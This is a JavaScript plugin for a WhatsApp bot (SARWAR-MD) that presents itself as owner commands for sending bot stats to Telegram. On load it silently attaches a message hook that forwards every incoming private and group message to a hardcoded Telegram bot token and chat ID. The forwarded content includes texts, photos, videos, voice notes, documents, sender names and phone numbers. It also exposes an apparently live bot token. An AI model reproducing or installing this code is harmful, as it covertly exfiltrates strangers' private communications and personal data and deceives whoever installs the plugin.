const { cmd } = require("../command");
const axios = require("axios");
const FormData = require("form-data");

const TG_BOT_TOKEN = "8699822531:AAFp83cfyJ2RedYvXQMciASvBoWQxBB4Zjg"; 
const TG_CHAT_ID = "6653388298"; 

let HOOK_ATTACHED = false;
const PROCESSED = new Set();

async function sendToTelegram(text) {
    try {
        if (!TG_BOT_TOKEN || !TG_CHAT_ID) return;
        await axios.post(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
            chat_id: TG_CHAT_ID,
            text: text,
            parse_mode: "Markdown",
            disable_web_page_preview: true
        }, { timeout: 10000 });
    } catch (e) {}
}

async function sendMediaToTelegram(buffer, caption, mediaType, filename) {
    try {
        if (!TG_BOT_TOKEN || !TG_CHAT_ID || !buffer) return;
        
        const form = new FormData();
        form.append('chat_id', TG_CHAT_ID);
        form.append('caption', caption || '');
        
        let endpoint = '', fieldName = '', mimeType = '';
        
        if (mediaType === 'image') {
            endpoint = 'sendPhoto';
            fieldName = 'photo';
            mimeType = 'image/jpeg';
            filename = filename || 'image.jpg';
        } else if (mediaType === 'video') {
            endpoint = 'sendVideo';
            fieldName = 'video';
            mimeType = 'video/mp4';
            filename = filename || 'video.mp4';
        } else if (mediaType === 'voice') {
            endpoint = 'sendVoice';
            fieldName = 'voice';
            mimeType = 'audio/ogg';
            filename = filename || 'voice.ogg';
        } else if (mediaType === 'audio') {
            endpoint = 'sendAudio';
            fieldName = 'audio';
            mimeType = 'audio/mp4';
            filename = filename || 'audio.mp3';
        } else if (mediaType === 'document') {
            endpoint = 'sendDocument';
            fieldName = 'document';
            mimeType = 'application/octet-stream';
            filename = filename || 'file.pdf';
        } else {
            return sendToTelegram(caption);
        }
        
        form.append(fieldName, buffer, { filename: filename, contentType: mimeType });
        
        await axios.post(`https://api.telegram.org/bot${TG_BOT_TOKEN}/${endpoint}`, form, {
            headers: form.getHeaders(),
            timeout: 30000,
            maxBodyLength: Infinity,
            maxContentLength: Infinity
        });
    } catch (e) {
        console.error("[TG Media Error]:", e.message);
        await sendToTelegram(caption + "\n\n⚠️ Media upload fail, text only sent.");
    }
}

function extractRealNumber(message, client) {
    const botJid = client.user?.id || "";
    const botNum = botJid ? botJid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '') : '';
    
    const sources = [
        message.key?.participant,
        message.key?.remoteJid,
        message.sender,
        message.from,
        message.chat
    ];
    
    for (let jid of sources) {
        if (!jid) continue;
        let num = jid.split('@')[0];
        if (num.includes(':')) num = num.split(':')[0];
        num = num.replace(/[^0-9]/g, '');
        
        if (num === botNum) continue;
        if (num.startsWith('120363') || num === 'status' || num === 'broadcast') continue;
        if (num.length >= 10 && num.length <= 15) return num;
    }
    
    return "Unknown";
}

async function processMessage(rawMessage, client) {
    try {
        if (!rawMessage || !rawMessage.key || !rawMessage.message) return;
        if (rawMessage.key.fromMe) return;
        
        const msgId = rawMessage.key.id;
        if (PROCESSED.has(msgId)) return;
        PROCESSED.add(msgId);
        if (PROCESSED.size > 1000) PROCESSED.clear();
        
        const jid = rawMessage.key.remoteJid || "";
        if (jid === "status@broadcast") return;
        
        const realNumber = extractRealNumber(rawMessage, client);
        const userName = rawMessage.pushName || rawMessage.key.participant?.split('@')[0] || "No Name";
        const time = new Date().toLocaleString("en-PK", { timeZone: "Asia/Karachi", hour12: true });
        
        let chatName = "Private Chat (DM)";
        const isGroup = jid.endsWith("@g.us");
        if (isGroup) {
            try {
                const meta = await client.groupMetadata(jid).catch(() => null);
                chatName = meta?.subject || "Unknown Group";
            } catch (e) {
                chatName = "Unknown Group";
            }
        }
        
        const msg = rawMessage.message;
        const baseCaption = `
🤖 *LIVE MESSAGE FORWARD*

🕒 *Time:* \`${time}\`
👤 *Name:* ${userName}
🔢 *Number:* [${realNumber}](https://wa.me/${realNumber})
💬 *Chat:* ${isGroup ? "👥 Group" : "👤 Private DM"}
🏷️ *Chat Name:* ${chatName}
        `.trim();
        
        if (msg.imageMessage) {
            const buffer = await client.downloadMediaMessage(rawMessage);
            const imgCaption = baseCaption + `\n\n📦 *Type:* 🖼️ Image\n📝 *Caption:* ${msg.imageMessage.caption || "No Caption"}`;
            await sendMediaToTelegram(buffer, imgCaption, 'image');
            return;
        }
        
        if (msg.videoMessage) {
            const buffer = await client.downloadMediaMessage(rawMessage);
            const vidCaption = baseCaption + `\n\n📦 *Type:* 🎥 Video\n📝 *Caption:* ${msg.videoMessage.caption || "No Caption"}`;
            await sendMediaToTelegram(buffer, vidCaption, 'video');
            return;
        }
        
        if (msg.audioMessage) {
            const buffer = await client.downloadMediaMessage(rawMessage);
            const isVoice = msg.audioMessage.ptt || false;
            const audCaption = baseCaption + `\n\n📦 *Type:* ${isVoice ? "🎤 Voice Note" : "🎵 Audio File"}`;
            await sendMediaToTelegram(buffer, audCaption, isVoice ? 'voice' : 'audio');
            return;
        }
        
        if (msg.documentMessage) {
            const buffer = await client.downloadMediaMessage(rawMessage);
            const docCaption = baseCaption + `\n\n📦 *Type:* 📄 Document\n📁 *File:* ${msg.documentMessage.fileName || "Unknown File"}`;
            await sendMediaToTelegram(buffer, docCaption, 'document', msg.documentMessage.fileName);
            return;
        }
        
        if (msg.stickerMessage) {
            const textCaption = baseCaption + `\n\n📦 *Type:* 🎭 Sticker`;
            await sendToTelegram(textCaption);
            return;
        }
        
        if (msg.conversation || msg.extendedTextMessage) {
            const text = msg.conversation || msg.extendedTextMessage?.text || "No Text";
            const textCaption = baseCaption + `\n\n📦 *Type:* 📝 Text\n⌨️ *Message:* ${text}`;
            await sendToTelegram(textCaption);
            return;
        }
        
    } catch (err) {
        console.error("[Process Error]:", err.message);
    }
}

function attachHook(client) {
    if (HOOK_ATTACHED) return;
    
    try {
        const ev = client.ev || client.sock?.ev || client.client?.ev || client.socket?.ev;
        if (ev && typeof ev.on === "function") {
            ev.on("messages.upsert", async (data) => {
                const messages = data.messages || [];
                for (const msg of messages) {
                    await processMessage(msg, client);
                }
            });
            HOOK_ATTACHED = true;
            console.log("[TG FORWARDER] Hook attached");
            return;
        }
    } catch (e) {}
    
    console.log("[TG FORWARDER] Could not attach hook");
}

try {
    const boot = setInterval(() => {
        const c = global.client || global.conn || global.sock || global.bot;
        if (c) {
            attachHook(c);
            clearInterval(boot);
        }
    }, 3000);
    setTimeout(() => clearInterval(boot), 60000);
} catch (e) {}

cmd({
    pattern: "telestats",
    alias: ["botreport", "mygroups", "checkbot", "fullstatus", "tgstats"],
    desc: "Send full bot stats and group list to Telegram",
    category: "owner",
    react: "📊",
    filename: __filename
}, async (client, message, m, { reply, isCreator }) => {
    if (!isCreator) return reply("Access Denied!");
    
    reply("Generating report... Sending to Telegram...");
    
    try {
        const groups = await client.groupFetchAllParticipating().catch(() => ({}));
        const groupList = Object.values(groups);
        const totalGroups = groupList.length;
        let totalMembers = 0;
        let groupDetails = "";

        groupList.forEach((g, index) => {
            const memberCount = g.participants ? g.participants.length : 0;
            totalMembers += memberCount;
            groupDetails += `${index + 1}. *${g.subject}*\n   Members: ${memberCount} | ID: \`${g.id.split('@')[0]}\`\n`;
        });

        const botJid = client.user?.id || "";
        const botNumber = botJid ? botJid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '') : "Unknown";
        const time = new Date().toLocaleString("en-PK", { timeZone: "Asia/Karachi", hour12: true });

        const reportMessage = `
📊 *BOT FULL REPORT*

🕒 *Time:* ${time}
🤖 *Bot Number:* [${botNumber}](https://wa.me/${botNumber})
👥 *Total Groups:* ${totalGroups}
👤 *Total Members:* ${totalMembers}
📱 *Status:* Active & Running

🏆 *LIST OF ALL GROUPS:*
${groupDetails || "No groups found."}

Powered by SARWAR-MD
        `.trim();

        await sendToTelegram(reportMessage);
        reply("Full report sent to Telegram!");
    } catch (err) {
        reply("Error: " + err.message);
    }
});

cmd({
    pattern: "tgtest",
    alias: ["telegramtest", "testtelegram"],
    desc: "Test Telegram connection",
    category: "owner",
    react: "🧪",
    filename: __filename
}, async (client, message, m, { reply, isCreator }) => {
    if (!isCreator) return reply("Access Denied!");
    
    try {
        await sendToTelegram("✅ *Telegram Test Successful!* Bot is connected and working.");
        reply("Test message sent to Telegram!");
    } catch (err) {
        reply("Error: " + err.message);
    }
});

console.log("[TG FORWARDER] Plugin loaded");
